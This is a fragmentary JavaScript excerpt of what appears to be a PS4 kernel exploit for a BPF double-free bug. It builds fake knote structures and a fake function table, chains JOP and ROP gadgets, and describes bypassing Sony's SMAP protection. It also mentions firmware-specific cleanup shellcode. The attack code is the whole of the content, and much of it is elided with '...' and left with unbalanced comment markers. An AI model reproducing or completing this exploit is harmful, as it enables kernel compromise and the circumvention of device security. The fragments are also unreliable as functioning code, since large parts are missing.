function kernExploit_bpf_double_free() {
	try {
		...
		// 3. Setup kernel ROP chain
		
		var krop = new rop();
		var kscratch = p.malloc32(0x1000); // Temp buffer for JOP gadgets and for kROP
		var ctxp = p.malloc32(0x1000); // ctxp = knote
		var ctxp1 = p.malloc32(0x1000); // ctxp1 = knote->kn_fop
		var ctxp2 = p.malloc32(0x1000); // ctxp2 = knote->kn_link
		...
		/**
			* Qwerty Madness!
			* -
			* This section contains magic. It's for bypassing Sony's ghetto "SMAP" using JOP gadgets.
		...
		**/
		...
		p.write8(ctxp.add32(0x68), ctxp1); // Set knote->kn_fop to fake function table
		
		//p.write8(ctxp1.add32(0x10), window.gadgets["infloop"]); // Set kn_fop->f_detach to first JOP gadget
		p.write8(ctxp1.add32(0x10), window.gadgets["jop1"]); // Set kn_fop->f_detach to first JOP gadget
		stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
		
		p.write8(ctxp.add32(0x00), ctxp2); // Set knote->kn_link (set rdi) - not important for kqueue per se, but for the JOP gadget
		p.write8(ctxp.add32(0x10), ctxp2.add32(0x08)); // Set RDI+0x10 with the value that will be written to RDI by jop2
		...
		p.write8(raxbase.add32(0x30), window.gadgets["jop_mov rbp, rsp"]); // Chain to next gadget - save RSP to RBP
		...
		*/
		...
		//p.write8(raxbase.add32(window.gadgets_shift["jump_shift_jop6"]), memcpy); // Chain to memcpy - skip prolog covering side effecting branch and skipping optimizations
		...
		**/
		...
		// 4. Setup shellcode for post exploit cleanup

		// Allocate shellcode to clean up memory just after kernel exploit
		if (fwFromUA == "5.05" && devkit == true) {
		...
		} else if (window.ps4_fw < 405) { // these FWs are not ported yet
		...
		*/
		while (1) {
			...
			// 7. Check if kernel chain has been ran and if so cleanup memory
